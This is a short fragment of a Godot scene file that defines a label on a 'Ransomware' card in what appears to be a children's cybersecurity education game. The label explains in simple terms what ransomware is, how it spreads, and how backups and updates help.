[node name="Label" parent="CyberAttackCards/VBoxContainer/Ransomware_card/MarginContainer/VBoxContainer" index="3"]
text = "Ransomware is a kind of harmful software that locks your files and asks for money to unlock them. Imagine someone putting a padlock on your school bag and saying you need to pay to get the key. It usually spreads through suspicious emails, links, or downloads, and once it’s in your computer, it blocks you from your own files. The problem is, even if you pay, there’s no promise you’ll get them back, which is why it’s so important to be careful online, keep backups, and update your devices.
"

